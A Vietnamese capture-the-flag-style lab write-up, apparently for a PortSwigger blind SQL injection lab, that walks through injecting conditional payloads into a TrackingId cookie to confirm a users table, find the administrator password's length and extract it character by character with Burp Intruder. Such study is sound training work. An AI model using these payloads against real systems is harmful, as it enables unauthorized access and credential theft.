# Đầu bài cho biết:
- Ứng dụng có lỗ hổng Blind SQL injection trong cookie theo dõi.
- Ứng dụng thực hiện truy vấn SQL chứa giá trị cookie.
- Kết quả truy vấn SQL không được trả về và không có thông báo lỗi.
- Ứng dụng hiển thị thông báo "Welcome back" nếu truy vấn trả về bất kỳ hàng nào.
- Cơ sở dữ liệu chứa bảng users với các cột username và password.

# Yêu cầu:
- Khai thác lỗ hổng Blind SQL injection để tìm mật khẩu của người dùng administrator.
- Đăng nhập với tư cách người dùng administrator.

![image](https://github.com/user-attachments/assets/ad9f2c79-4022-478e-923d-6a28b0234952)

# Solution:

- Dùng Burp, kiểm tra trong header giá trị TrackId, chuyển qua Repeater để sửa TrackId đó
- Vì giá trị trong TrackId là luôn đúng rồi nên khi thêm điều kiện để thử thì có thể kết nối bằng AND

- ' AND '1'='1
Có chữ welcome back

- ' AND '1'='2
Mất chữ welcome back

- ' AND (SELECT 'a' FROM users LIMIT 1)='a
    + Câu này dùng để ktra xem có bảng `users` và có ít nhất 1 hàng hay không, nếu có thì trả về 'a' và khi 'a'='a' thì kết quả cũng là True. Hiện WCBack
    + Nếu không có bảng `users` thì không xuất hiện WCBack
    + Nếu có bảng users nhma ko có hàng nào thì nó sẽ trả về NULL và kết quả là False.
    + LIMIT 1: dùng để chỉ lấy duy nhất 1 hàng, khi không có, nếu bảng `users` có nhiều hàng thì nó sẽ trả về nhiều giá trị 'a', và để so với đơn trị 'a' thì sẽ sai.

- ' AND (SELECT 'a' FROM users WHERE username = 'administrator')='a

- ' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > 10)='a
- ' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) = 20)='a

- ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
/*
    SUBSTRING(string, start, length)
    SUBSTRING('abcdefg', 3, 2) sẽ trả về 'cd'. (Bắt đầu từ vị trí thứ 3, lấy 2 ký tự).
    SUBSTRING('Hello world', 7, 5) sẽ trả về 'world'.
*/

- Rồi đưa nó vào Intruder để test từng chữ một
- Được pass: ppylw9n6f9kzxs5m4oo5
